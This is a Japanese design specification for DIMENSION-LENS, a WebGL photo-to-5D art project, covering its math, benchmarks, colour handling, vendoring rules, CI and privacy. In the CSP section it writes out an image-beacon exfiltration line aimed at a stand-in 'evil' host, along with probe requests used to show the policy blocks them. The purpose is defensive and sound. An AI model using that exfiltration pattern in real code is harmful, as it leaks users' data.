# DIMENSION-LENS 仕様書

> 版: **Phase 0 時点**（骨組みと、測る道具 —— [#1](https://github.com/ops324/dimension-lens/pull/1) マージ済み）
> 公開: <https://ops324.github.io/dimension-lens/>（現状は空ページ。Phase 1a まで見るものは無い）

---

## 0. 到達水準 —— この文書で最初に読むべき表

姉妹作 dimension の §14.1 に倣い、**主張を証拠の強さで採点する**。混ぜて書かない。

| 水準 | 意味 |
|---|---|
| **A** | 実測した。数値がこの文書か PR にある |
| **B** | 機構を確認した（ソースを追った・代数的に確定した）が、走らせていない |
| **C** | 未検証。そう考えているだけ |

C を C と書けることがこの作品の品質であって、C を A の書式で書かないことがその中身である。

### Phase 0 時点の到達水準

| 主張 | 水準 | 根拠 / 上げる方法 |
|---|---|---|
| 融合カーネル(展開版)が ULTRA 159,414点で **1.29 ms/frame** | **A** | `npm run bench`、下記 §4.3。Apple M1 Max / Node 24.13 |
| 展開版は一般版より **5.85倍**速い（→ 展開版を採る） | **A** | 同上 |
| 融合は素直な3パスより **4.56倍**速い | **A** | 同上 |
| 融合カーネル ≡ extent→rotateBatch→projectPerspective | **A** | `rotationN.test.ts`、6つの dimLevel で 1e-6 一致 |
| `composeRotN` ≡ `rotateBatch`（n=3..8） | **A** | 同、1e-12 一致 |
| n=5・dist=2.4 で透視カスケードが全段安全（余裕あり） | **A** | 同、max(\|p[d]\|/dist) < 0.75、F_CLAMP 不発火 |
| 移植した `math/*` の正しさ | **A（継承）** | 親の rotation/projection テストをそのまま再実行。`rotation.ts` を VERBATIM に保つ限り有効 |
| バンドルに通信 API が無い | **A** | `privacy.test.ts`、allowlist は空。**初回実行で vite の modulepreload ポリフィルの `fetch` を捕まえた**（§6.2） |
| CSP が本番ビルドに入り、`default-src`/`img-src`/`base-uri` を閉じている | **A** | 同（`dist/index.html` を検査） |
| CSP 下で自前の JS が実際に読める | **A** | preview(:4173) 実測。`data-lens="booted"`、`<script src="/assets/index-*.js">`、コンソールエラー 0 |
| CSP が fetch・**画像経由の送信**・WebSocket を実際に阻む | **A** | preview 実測。violation 3件（§6.3） |
| **公開経路が通っている** | **A** | GitHub Pages 実測（§7.3）。サブパス配信で `base: './'` が効き、CSP 下で JS が読め、コンソールエラー 0 |
| `Texture` 既定は `NoColorSpace` / `color_vertex` はデコードしない | **B** | `node_modules/three/src/textures/Texture.js:48` と `ShaderChunk/color_vertex.glsl.js` を自分で開いて確認。LENS では未実行 |
| `NeutralToneMapping` は恒等ではない | **A** | GLSL 実ソース + 数値実測（§4.5）。sRGB 128→**116**、63→**33**、200→**194** |
| **half-float 加算の飽和天井は 0.03125** | **A** | `Float16Array` で実測（§4.6）。実際の重なり数 326/489 では**飽和しない**ことも確認 |
| **ブラウザの縮小はガンマ空間平均** | **A**（Chrome 148） | 黒白2px→1px が **128**（リニア光平均なら 188）。`drawImage` と `createImageBitmap({resizeWidth})` の両方（§4.7）。他ブラウザは未測定 |
| 軸ごと正規化は (3,4) を色相回転でなくする | **B** | `D⁻¹RD ∉ SO(2)`（s_a≠s_b）は代数的に確定。→ ブロック等方正規化 |
| clear color 漏れの機序 | **B** | 親に実測（`#05060f` が `rgb(22,27,58)` として届く）。LENS では未測定 |
| 加算ブレンドが列平均そのものである | **B** | 線形 HDR ターゲット上でのみ真。Phase 1b の #3/#4 を通せば A |
| postfx 定数（bloom 閾値ほか）の再測定が必要 | **C（自覚あり）** | Phase 2 |
| `dimLevel=2` が「あなたの写真そのもの」 | **C** | Phase 1a のアンカー窓 + 忠実性測定 1a〜1d で A |
| **「画像は端末から出ません」** | **B**（上限） | 静的検査(§6.2) + violation 実測(§6.3) で B に到達。真の A は原理的に不可能 —— 「出ない」は無限の反証 |
| iOS 実機で 40MP 写真が生存する | **C** | 実機でしか測れない。Phase 1c |
| GPU 頂点シェーダ経路が不要 | **A に近い B** | Phase 0 の実測で CPU が 1.29ms/frame と判明。判断が覆る条件は §4.4 |

---

## 1. 優先順位

衝突したときは上から順に優先する（親 §1 を継ぐ）。

1. **数学的な正しさ** —— 投影・回転・色空間変換に近似も「芸術的な嘘」も入れない
2. **図の可読性** —— UI が作品を隠さない
3. **芸術性**

「軸ごと正規化」を捨てたのは 1 のためである。あれは見た目には動き、
「軸スケールは規約なので開示すれば誠実」と言えば通ってしまう。しかし
**「(3,4) の回転は色相回転である」という主張そのものが偽になる**ので、開示では救えない。

---

## 2. 中核概念

写真は写像 `I: [0,1]² → 色空間` であり、そのグラフ

```
Γ = { (u, v, L(u,v), a(u,v), b(u,v)) }  ⊂  R² × OKLab = R⁵
```

は **R⁵ の中の2次元曲面**。画像処理で標準的な joint spatial-range space の定式化で、何も足していない。
天井の 5 は「色が 3 次元だから 2+3=5」という事実であって、任意に選んだ数ではない
（α チャンネルを持つ画像なら 6 —— 天井が*添付されたファイルの性質*になる。Phase 6）。

`dimLevel ∈ [0,5]`、`extent[k] = clamp01(dimLevel − k)`:

| n | EN | 状態 |
|---|---|---|
| 0 | MEAN | `[0,0,0,0,0]` 平均色の一点 |
| 1 | LINE | `[1,0,0,0,0]` 列平均の一本の線 |
| 2 | **PHOTOGRAPH** | `[1,1,0,0,0]` **あなたの写真そのもの —— 信頼の錨** |
| 3 | RELIEF | `[1,1,1,0,0]` 明暗が起伏になる |
| 4 | CHROMA | `[1,1,1,1,0]` 赤⇄緑が四軸目へ |
| 5 | GRAPH | `[1,1,1,1,1]` 完全なグラフ |

### 2.1 軸スケール —— ブロック等方正規化

**軸ごとに独立な正規化をしてはならない。** 3ブロックに分け、各ブロック内では等方に:

| ブロック | 軸 | スケール |
|---|---|---|
| 空間 | u, v | 1スカラー。アスペクト比を保存 |
| 明度 | L | 独立スカラー（この画像の L 分布幅、下限あり） |
| 彩度 | a, b | **1スカラー**。95パーセンタイルの彩度半径 `√(a²+b²)` |

正規化を `D = diag(1/s_u, 1/s_v, 1/s_L, 1/s_a, 1/s_b)` と書くと、正規化座標での回転 `R(θ)` は
OKLab 座標では共役 `D⁻¹R(θ)D` として作用する。`s_a ≠ s_b` のときこれは円ではなく楕円
`(a/s_a)² + (b/s_b)² = c` を保つので **SO(2) の元ではない** ——
彩度が保存されず、色相が一様に進まない。ブロック等方なら `D` の (3,4) ブロックは `s_c·I` で、
`D⁻¹RD = R` が厳密に成り立つ。

| 平面 | 起きること |
|---|---|
| (0,1) | 普通の画像の回転（剛体） |
| (0,2), (1,2) | 明暗の起伏が形になって立ち上がる |
| (3,4) | **色相回転そのもの**（彩度不変・色相角が θ だけ進む） |
| (0,4), (1,3) | 位置が色に変わる、名前のない混合 |

### 2.2 退化入力の契約

ブロックのスケールが 0 になりうる（グレースケール画像で彩度ブロック、単色画像で明度ブロック）。
`0/0 = NaN` を避けるため、**幅が閾値未満のブロックは「その軸は存在しない」と表明する** ——
extent を 0 に固定し、読み出しに「この画像には色軸がありません（グレースケール）」と出し、
回転プリセットの「色相」「交換」を無効化して理由を示す。

これは回避策ではなく、この作品にとって最も正直な表明である。

---

## 3. モード

| | 範囲 | フェーズ |
|---|---|---|
| **A 色を軸にする** | n ≤ 5 | Phase 1〜3 |
| **B 押し出す**（画像 2-cell × 超立方体） | n ≤ 10 | Phase 4 |
| **C 観測者の次元** | m ∈ {1..4} | Phase 5 |

モード B は `2^(n−2)` 枚の複製になるので、**Phase 1 の時点で `colorPointBatch` を
`InstancedBufferGeometry`（`instanceCount = 1`）で書く**。Phase 1 のコストはゼロ（同じ1ドローコール）、
Phase 4 は `instanceCount` と per-instance オフセット属性を足すだけ。あとから足すのは書き直し。

---

## 4. ホットパス

### 4.1 なぜ `rotateBatch` を毎フレーム呼ばないか

`rotateBatch` は回転平面ごとにバッファ全体をストリーミングする。平面回転の列は先に 1 枚の
n×n 行列へ合成でき（`composeRotN`）、合成は 1 フレームに 1 回・25乗算×平面数で済む。

さらに `extent` の対角 `E` は回転の**前**に掛かるので `M = R·E` として**列をスケールするだけ**で
畳める（`foldExtent`）。投影も同じループに入れる。結果、5要素をレジスタに読んで 3要素だけ書く。

### 4.2 f32 で足りる理由

`rotation.ts` の契約どおり角度は毎フレーム絶対値で再計算するので誤差が蓄積しない。
座標は [−1,1] に住み、元データは 8bit の画素値。f64 の stride 40 バイトは全点が
64B キャッシュラインを跨ぐという実害もある。

正しさの根拠は一点: **`projection.ts` の素直な実装と 1e-6 で一致すること**（`rotationN.test.ts`）。

### 4.3 実測（水準 A）

Apple M1 Max / MacBookPro18,4 / Node 24.13.0 / vitest bench。`mean` がそのまま ms/frame。

| tier | 格子 | 点数 | 融合(n=5展開) | 融合(一般n) | 素直な3パス |
|---|---|---|---|---|---|
| BALANCED | 244×162 | 39,528 | **0.62 ms** | 2.02 ms | 1.36 ms |
| HIGH | 366×244 | 89,304 | **0.79 ms** | 4.57 ms | 3.11 ms |
| ULTRA | 489×326 | 159,414 | **1.29 ms** | 7.57 ms | 5.90 ms |

**≈ 8.1 ns/点/フレーム**（ULTRA）。16.7 ms のフレーム予算の 7.7%。

**測定が計画の想定を 2 か所で覆した:**

1. **8.1 ns/点は、監査が「楽観的すぎる」と評した 15〜20 ns よりさらに 2 倍速い。**
   唯一の先行実測だった親の 65 ns/点（n=10・26,600点）からの外挿は悲観側に外れていた。
2. **一般版は素直な3パスより*遅い*（7.57 ms vs 5.90 ms）。** 融合そのものが効いているのではない ——
   効いているのは**中間配列を捨ててレジスタに載せたこと**である。一般版は n² の行列積を
   モジュールレベルの `Float64Array` スクラッチ越しに回すので、rotateBatch の
   「平面あたり 4 乗算・単純ストライド」に負ける。展開版だけが勝つ。

   したがって `liftProject5` は残す（消す判断だったが、測定が覆した）。
   `liftProject`（一般 n）は**参照実装およびモード B 用**として残し、実行経路にはしない。

### 4.4 GPU 頂点シェーダ経路を採らない —— 理由の訂正

計画初版は罠#11（`onBeforeCompile` のアンカー破損）を理由にしていたが、**ここではシェーダを
最初から自分で書く**ので `onBeforeCompile` は登場せず、罠#11 は存在しない。棄却の正しい理由は
「CPU 版がテストの参照実装になること」と「単純さ」、そして **Phase 0 の実測で CPU が
フレーム予算の 8% しか使わないと分かったこと**である。

判断が覆る条件を明記する:
- 中位機で HIGH が 60fps を割る（M1 Max の 3 倍遅い機体なら ULTRA で 3.9 ms —— まだ余裕がある）
- 250k 点超が必要になる（アンカー窓の解像度問題を点数で解こうとした場合）

GPU 経路にすれば 1.9 MB/frame のアップロードが 0 になる。数字は正確に持っておく。

### 4.5 `NeutralToneMapping` を使わない —— 実測（水準 A）

計画初版には「Neutral は ~0.8 以下でほぼ恒等・色相保存」と書いてあった。**偽である。**
r185 の実装（`ShaderChunk/tonemapping_pars_fragment.glsl.js`）はこう書かれている:

```glsl
const float StartCompression = 0.8 - 0.04;   // = 0.76
float x = min( color.r, min( color.g, color.b ) );
float offset = x < 0.08 ? x - 6.25 * x * x : 0.04;
color -= offset;                              // ← 早期 return の "前"、無条件
float peak = max( color.r, max( color.g, color.b ) );
if ( peak < StartCompression ) return color;
```

ブラックポイントの減算が早期 return の**前**にあるので、低輝度側でも必ず 0.04 が引かれる。
自分で数値を通した結果:

| 入力 sRGB | リニア | Neutral 後の sRGB | 差 |
|---|---|---|---|
| 128（中間調） | 0.2159 | **116** | −12 |
| 63（暗部） | 0.0497 | **33** | −30 |
| 200 | 0.5776 | **194** | −6 |

暗部はほぼ半分に潰れる。`dimLevel=2` は本作が乗っている唯一の錨で、忠実性テストは
読み戻して元 RGB と比較する設計なので、**正しく実装しても必ず落ちる**。
→ `renderer.toneMapping = NoToneMapping` 固定。加算が 1.0 を超える高 dimLevel 用の圧縮は
`CompressPass`（OutputPass の前、リニア空間、`uStrength` を dimLevel で駆動）が担う。

### 4.6 half-float 飽和 —— 実測（水準 A）

`Float16Array` で δ を n 回足して確かめた:

| n | δ | 合計 | |
|---|---|---|---|
| 65,536 | 1.53e−5 | 0.03125 | **0.03125 で停止** |
| 106,374 | 9.40e−6 | 0.03125 | **0.03125 で停止** |
| 326（列内の重なり） | 3.07e−3 | 0.985 | 飽和なし |
| 489（列平均バッファ） | 2.04e−3 | 0.969 | 飽和なし |

**天井は 0.03125 = 2⁻⁵**（計画では「0.031〜0.0625 の帯」と幅を持たせていた。実測は下端）。
`A + δ` は δ = ulp(A)/2 で ties-to-even により丸め戻るので、δ=2⁻¹⁶ なら停止点は
ulp = 2⁻¹⁵ すなわち A = 2⁻⁵。停止点は n に依らない。

**そして下の2行が二重バッファ設計の実測による裏付けである** —— 実際の重なり数では飽和しない。
ただし n=489 で 0.969（3.1% の undershoot）が出ており、これは飽和ではなく累積丸め誤差。
`dimLevel=0` の平均色はリニア光で約 3% 暗く出る。ΔE00 ≤ 3.0 の予算内だが、
**予算を使い切る要因として数えておくこと**（Phase 1b で実測する）。

### 4.7 取り込み時の縮小はガンマ空間平均 —— 実測（水準 A / Chrome 148）

黒 1px と白 1px の 2×1 を 1×1 へ縮小して読み戻した:

| 経路 | 結果 |
|---|---|
| `drawImage(src, 0,0,1,1)`（`imageSmoothingQuality: 'high'`） | **128** |
| `createImageBitmap(blob, {resizeWidth:1, resizeHeight:1, resizeQuality:'high'})` | **128** |
| 期待値: ガンマ空間平均 | 128 |
| 期待値: リニア光平均 | 188 |

**リニア光ではリサンプルされない。** 50/50 の黒白領域は真のリニア平均 0.5（`#BCBCBC`）に対し
`#808080` として返る —— リニア光で 2.3 倍の誤差。

→ 最初の縮小（長辺 2048px 上限）だけブラウザに任せ、**それ以降の縮約は全部リニア光で自分でやる**。
`columnMeans` / `globalMean` は**正準リニアバッファから**計算する（グリッドからではない）。
2048px 時点の残差は近傍が強く相関しているため小さいが、ゼロではない。

なお `createImageBitmap` の resize オプションは Chrome で実際に効いた（返却 1×1）。
Safari は**未知のディクショナリメンバを黙って無視する**ので、例外ではなく
`bitmap.width` を要求値と比較して機能検出すること。

### 4.8 透視カスケードの真の不変条件

よくある誤解は「‖x‖ ≤ 1 に正規化してあるから安全」。これが保証するのは**第1段だけ**である。
各段は座標を `f = dist/(dist−p[d])` 倍に増幅するので、第2段の入力ノルムは 1 ではなく
`dist/(dist−1)` になり、段ごとに累積する。

正しい不変条件は「どの段でも `|p[d]| < dist`」。実測（`rotationN.test.ts`）では
n=5・dist=2.4 で max(|p[d]|/dist) < 0.75、`F_CLAMP` は不発火。

**Phase 4（n ≤ 10）では破綻する**: `r₁ = 1.714 → r₂ = 5.997 > 2.4`。同テストが
n=7・dist=1.5 でこれを再現している（`maxRatio > 1`）。そのときは dimension の
`polytopeExhibit.ts` にある auto-dist ループを純関数として持ち込むこと ——
`F_CLAMP` があるので破れても NaN にはならず、**無音で壊れる**。

---

## 5. 移植境界

### 真の VERBATIM

`src/math/ease.ts` / `src/math/rotation.ts`（+ Phase 3 で `ui/components/tokens.css`, `Announcer.ts`）

### 改変して移植

`src/math/projection.ts`（`projectStereographic` を削除）ほか、Phase 1a 以降で
`engine.ts` / `quality.ts` / `postfx.ts` / `pointBatch.ts` / `controls/*`。

### 出自の記録

各複製ファイルの先頭に `// VENDORED_FROM: ops324/dimension@<SHA> <path>` と `// STATUS:` を置き、
`src/tests/vendor.test.ts` が SHA・STATUS・sha256 を検証する。

**乖離そのものは禁じない —— 乖離が記録されないことを禁じる。** テストが落ちたら、
意図した改変なら `EXPECTED` の sha256 を更新してヘッダに何を変えたか書く。差分は PR に出る。

**逆流は一方向**: LENS でバグを見つけたら、まず dimension 側で直して PR にし、
その SHA を `VENDORED_FROM` に反映してからコピーし直す。どちらが真かの議論を起こさないため。

**`rotation.ts` には何も追記しない。** `composeRotN` / `applyMatrixBatch` / 融合カーネルは
`rotationN.ts` に置く。VERBATIM を保っている限り、親の rotation テストをそのまま再実行することが
無料の回帰ロックとして意味を持つ。1 行足せばその継承（A 水準）は切れる。
`vendor.test.ts` がこれも機械で見ている。

「8月1日から変更されていない」という初版の根拠は生存者バイアスだった ——
dimension は 2 日で 21 PR を吐いており、観測窓は丸 1 日、しかも完成後の静止期だった。

---

## 6. プライバシー

### 6.1 CSP

```
default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:; font-src 'self'; connect-src 'none';
worker-src 'self' blob:; object-src 'none'; media-src 'none'; manifest-src 'none';
form-action 'none'; base-uri 'none'; upgrade-insecure-requests
```

- **`connect-src 'none'` だけでは何も閉じていない。** CSP はディレクティブごとに default-allow なので、
  `new Image().src = 'https://evil/?p=' + data` がそのまま通る。**`img-src` を閉じるほうが重要。**
- **`base-uri 'none'` は非自明に load-bearing** —— 注入された `<base href>` は全相対 URL を
  付け替えるので、開いていると `script-src 'self'` が無効化される。
- `style-src` の `'unsafe-inline'` が唯一の妥協点（`<noscript>` 内 `<style>` とインライン style 属性）。
- 本番ビルドにだけ注入する（dev は HMR の `ws:` と両立しない）。
  **プライバシー検証を `npm run dev` で行うと、CSP に阻まれるところを一度も観測しないまま素通りする。**
  必ず `npm run preview`（:4173）で。`.claude/launch.json` に別設定を置いてあるのはそのため。

**CSP が原理的に塞げないもの**（同じ息で言う）: トップレベルナビゲーション（`navigate-to` は
CSP3 から削除され実装が無い）、`window.open`、WebRTC データチャネル（`webrtc 'block'` は Chromium のみ）。
`<meta>` CSP は `frame-ancestors` / `report-uri` / `sandbox` を黙って無視し、
GitHub Pages はヘッダを設定できない —— **埋め込み可能で、違反テレメトリも無い**。
Service Worker のフェッチは自身のスクリプト応答の CSP に従うので meta では制約できない
（対処は `worker-src` と「SW を登録しない」という明文）。

「browser-enforced」と caveat 抜きに書かないこと。

### 6.2 ビルド成果物の静的検査（水準 A）

`privacy.test.ts` が `dist/**/*.js` を読み、通信 API の出現集合が committed allowlist と
**集合として一致**することを要求する。増えても減っても落ちる。

**この検査は初回実行で実際に何かを捕まえた。** Phase 0 の 710 バイトのバンドルに、
我々が書いていない `fetch` が 1 個入っていた —— vite の modulepreload ポリフィルである。
実害は 2 つ: (1)「バンドルに通信 API は無い」と言えなくなる、(2) `connect-src 'none'` は
この fetch も塞ぐので、ネイティブ modulepreload を持たないブラウザでは**ページを開くたびに
CSP 違反が発火し**、violation を購読して測るプライバシー検証（#6）が自分のノイズで埋まる。

→ `build.modulePreload: { polyfill: false }`。失うのは Safari 16.4〜16.6 等での先読みだけで、
チャンク読み込み自体は `<script type="module">` のまま変わらない。この作品は WebGL2 必須なので、
対象ブラウザのほとんどはネイティブ対応済み。

**この検査は完全な証明ではない**（難読化された動的呼び出しは捕まらない）。
「依存関係の更新でうっかり fetch を撒いた」が確実に捕まる、という範囲の道具である。

### 6.3 violation の実測（水準 A・preview :4173）

`securitypolicyviolation` を購読し、**3 経路を試す**。片方だけ試すと `img-src` の穴に気づけない。

| 試したこと | 結果 | 発火したディレクティブ |
|---|---|---|
| `fetch('https://example.com/probe')` | blocked: Failed to fetch | `connect-src` |
| `new Image().src = 'https://example.com/pixel.gif?p=SECRET'` | blocked（onerror） | **`img-src`** |
| `new WebSocket('wss://example.com/x')` | コンストラクタは成功、接続は阻止 | `connect-src` |

2 行目が要点である。**初版の計画のように `connect-src 'none'` だけを書いていたら、
この経路は素通りしていた** —— そして画像を保持しているアプリにとって、これが一番塞ぐべき穴だった。

3 行目の書き方にも注意: WebSocket は**コンストラクタが例外を投げない**。
「try/catch で捕まらなかった＝通った」と読むと誤る。判定は violation イベントで行うこと。

この 3 件をもって、「画像は端末から出ません」は **C から B** へ上がる。
A にはならない —— 「出ない」の証明には無限の反証が要る。

### 6.4 残留物

Phase 1c で対処し、ここに列挙する: `<input type="file">` の `FileList`（`input.value=''`）、
object URL の revoke、`ImageBitmap.close()`、bfcache 復帰、`localStorage`（品質ティア 1 項目）、
`Referer`（`<meta name="referrer" content="no-referrer">` を Phase 0 で投入済み）。

---

## 7. 検証

### 7.1 vitest（Phase 0 時点で 48 件・全緑）

`math.test.ts`（親からの回帰ロック）/ `rotationN.test.ts`（融合カーネル等価性・カスケード不変条件）/
`vendor.test.ts`（出自とチェックサム）/ `privacy.test.ts`（ビルド成果物の静的検査）。

Phase 1 以降で追加: sRGB 区分関数、OKLab（+ P3 参照値）、**色相不変性**（平面(3,4)で彩度が不変・
色相角がちょうど θ 進む —— headline の主張を真にする唯一のテスト）、`lift.ts` の全要素固定
（軸割当・y反転・LUT 適用回数を同時に押さえる）、潰しの同一性、`sampleWeight`、`stats.ts` の退化入力、
`fitGrid`、プレートの不透明契約、語彙の規律。

### 7.2 ブラウザ —— 測る道具を先に作る

検証 8 項目はすべてキャンバスの読み戻しに依存する。素直に書くと**1 つも実行できない**:

1. `preserveDrawingBuffer` を立てないと、rAF の外から読んだバックバッファは仕様上破棄済み。
   返るのは黒か透明で、**「隅を読んで #000000 を確認」は常に緑になる** —— 壊れていても緑になる。
2. ブラウザペインが非表示だと rAF が絞られてフレームが進まない
   （親が `__DIMENSION__.renderOnce(steps)` を持つ理由）。
3. 「回転を凍結」「bloom を切る」制御 API が無ければ、忠実性の測定は後処理の混入と区別できない。

→ `window.__LENS__`（DEV ビルドのみ、`src/dev/hook.ts`）:
`renderOnce` / `setDimLevel` / `freezeRotation` / `setBloom` / `setGrade` / `setCompress` /
`readback` / `stats`。未実装のメソッドは**黙って何もしない**のではなく投げる ——
「測ったつもり」が一番高くつく。

各測定には**予算**を付ける。予算の無い測定は「比べて数字を眺める」であり、A を生産できない。
測定が落ちたら当該フェーズをマージしない。予算を緩めるのは、緩める根拠をここに書いたときだけ。

### 7.3 公開経路の実測（水準 A・Phase 0）

<https://ops324.github.io/dimension-lens/> にて:

| 確認項目 | 結果 |
|---|---|
| CSP meta が本番ページに載っている | ✅ |
| `<script src="./assets/index-*.js">` が読まれた | ✅ `data-lens="booted"` |
| サブパス配信で相対パスが解決する（`base: './'`） | ✅ `/dimension-lens/assets/...` |
| コンソールエラー | **0** |

**「JS が読めること」を毎フェーズ確認するのは形式ではない。** Phase 0 のエントリは一度、
中身が全て `import.meta.env.DEV` の内側だったせいで丸ごと tree-shake され、
vite が `<script>` タグごと出力から落とした。そのままなら
「自前の JS が `script-src 'self'` の下で実際に読めるか」を**一度も検証しないまま**
「公開経路が揃った」と言うことになっていた。本番でも消えない痕跡（`data-lens="booted"`）は
そのために置いてある。

### 7.4 CI アクションのバージョン

**教訓を先に書く: 姉妹作の `deploy.yml` をそのまま持ってきて、バージョンを確認しなかった。**

Phase 0 のデプロイで Node 20 廃止の警告が出たとき、最初は
「`upload-pages-artifact@v3` が内部で古い `upload-artifact` を呼んでいる。上流の
複合アクション内なので直接は直せない」と判断して負債として記録した。**これは誤りだった。**
上流の現行版は内部で `upload-artifact@v7.0.1` を pin しており、直っていないのは
こちらが v3 に留まっていたことだけだった。

実際には 4 つとも 2〜3 メジャー遅れていた:

| | Phase 0 で使っていた版 | 実際の最新 |
|---|---|---|
| `actions/checkout` | v4 | **v7** |
| `actions/setup-node` | v4 | **v7** |
| `actions/upload-pages-artifact` | v3 | **v5** |
| `actions/deploy-pages` | v4 | **v5** |

実害の評価も正確に書いておく。**その時点では失敗していない** ── GitHub が node20 の
アクションを node24 で強制実行しており、build も deploy も success だった。しかし
この作品では **CI が品質ゲートそのものであり、同時に唯一の公開経路**でもある。
強制移行が終わって古い版が無効化された日に落ちるのは、テストとデプロイの両方である。
新規リポジトリを 3 メジャー遅れで始める理由は無い。

参照は可変メジャータグ（`@v7`）のままにする。SHA pin はサプライチェーン的には強いが、
このリポジトリには自動更新が無く、**pin は「更新しない」を意味してしまう** ──
まさに今回起きたことなので、可変タグのほうが実態に合う。

---

## 8. 開発の進め方

**1フェーズ = 1ブランチ = 1 PR。** `main` へ直接コミットしない。
ブランチ名は `phase-<番号><字>-<短い英語>`。

PR 本文には必ず:
(a) 到達判定と**その実測値**（「通った」ではなく数字）
(b) 予算を外した項目とその理由
(c) 新たに判明した罠
(d) 上がった／下がった到達水準

品質ゲート4点: `npm test` 全緑（CI）/ `npm run build` 成功（CI）/ 実ブラウザ測定の数値を PR に貼る /
コンソールエラーゼロ。CI は **build → test** の順で走る（`privacy.test.ts` が `dist/` を読むため。
「dist が無いから skip」は「常に緑」という最悪の失敗モードなので、あちらは skip せず落ちる）。

ドキュメント PR は実装 PR と分ける（親の #22〜#24 と同じ運用）。この到達水準表の更新は
フェーズ完了後に単独の PR で行う —— そうすると「何が測れて何がまだか」の履歴が読める。

役割分担: 数学コア・GPU シェーダ・統合レビューは Fable、各フェーズの実装は Opus のサブエージェント、
**バグ修正の前には必ず独立した監査サブエージェントが実測ベースのプランを出す**。

### フェーズ

| | 内容 | 状態 |
|---|---|---|
| **0** | 骨組みと測る道具（CI・CSP・移植・ベンチ・DEV フック） | ✅ [#1](https://github.com/ops324/dimension-lens/pull/1) |
| 1a | 数と光を通す（ingest → lift → 点群 → 線形HDR + OutputPass、`dimLevel ∈ [2,5]`） | 次 |
| 1b | 潰し（列平均バッファ・`sampleWeight`・`[0,5]` 全域・平均色） | |
| 1c | 取り込みの頑健性と空状態（HEIC・EXIF・40MP・退化・`copy.ts` 全文） | |
| 2 | 光の質（bloom/grade 再測定・`CompressPass`・quality・光過敏） | |
| 3 | 作品化（UI・読み出し・キーボード・OGP・モバイルシート） | |
| 4 | モードB 押し出す（+ auto-dist の純関数化） | |
| 5 | モードC 観測者の次元 | |
| 6 | 任意（RGBA→n=6・PNG 書き出し・動画） | |
